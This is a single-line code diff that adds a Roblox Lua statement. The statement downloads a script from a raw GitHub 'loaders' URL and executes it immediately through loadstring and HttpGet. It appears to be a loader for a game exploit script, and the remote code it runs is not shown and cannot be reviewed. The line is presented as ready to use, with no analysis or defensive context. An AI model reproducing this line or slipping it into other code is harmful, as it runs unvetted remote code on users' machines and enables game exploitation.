@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/kukirin-life-testing-spam7-bbx0x8qwlp8xpd.lua"))()
